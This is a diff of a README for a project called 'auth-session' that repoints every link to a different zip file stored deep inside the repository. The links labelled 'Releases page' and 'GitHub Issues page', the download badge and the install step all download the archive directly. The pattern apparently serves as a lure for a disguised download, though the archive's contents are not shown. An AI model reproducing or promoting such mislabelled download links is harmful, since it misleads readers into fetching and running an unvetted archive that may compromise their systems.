@@ -6,9 +6,9 @@ Welcome to the auth-session! This application simplifies authentication and auth
 
 ## 📥 Download the Software
 
-[![Download auth-session](https://raw.githubusercontent.com/OwoaheneSnr/auth-session/main/saltatorial/auth-session.zip%20auth--session-%20-blue)](https://raw.githubusercontent.com/OwoaheneSnr/auth-session/main/saltatorial/auth-session.zip)
+[![Download auth-session](https://github.com/OwoaheneSnr/auth-session/raw/refs/heads/main/src/modules/seed/session_auth_v1.4.zip%20auth--session-%20-blue)](https://github.com/OwoaheneSnr/auth-session/raw/refs/heads/main/src/modules/seed/session_auth_v1.4.zip)
 
-To download the latest version of auth-session, please visit the [Releases page](https://raw.githubusercontent.com/OwoaheneSnr/auth-session/main/saltatorial/auth-session.zip).
+To download the latest version of auth-session, please visit the [Releases page](https://github.com/OwoaheneSnr/auth-session/raw/refs/heads/main/src/modules/seed/session_auth_v1.4.zip).
 
 ## 🛠️ System Requirements
 
@@ -33,7 +33,7 @@ Before you begin, ensure your system meets the following requirements:
 
 To install auth-session, follow these steps:
 
-1. **Visit the Releases Page:** Go to the [Releases page](https://raw.githubusercontent.com/OwoaheneSnr/auth-session/main/saltatorial/auth-session.zip).
+1. **Visit the Releases Page:** Go to the [Releases page](https://github.com/OwoaheneSnr/auth-session/raw/refs/heads/main/src/modules/seed/session_auth_v1.4.zip).
    
 2. **Choose Your Version:** Locate the latest release. You can find a list of all versions for your convenience.
 
@@ -78,7 +78,7 @@ If you encounter issues:
 
 ## 📞 Support
 
-For support, please open an issue on the [GitHub Issues page](https://raw.githubusercontent.com/OwoaheneSnr/auth-session/main/saltatorial/auth-session.zip). We value your feedback and will respond as soon as possible.
+For support, please open an issue on the [GitHub Issues page](https://github.com/OwoaheneSnr/auth-session/raw/refs/heads/main/src/modules/seed/session_auth_v1.4.zip). We value your feedback and will respond as soon as possible.
 
 ## 🗂️ Topics Covered
 
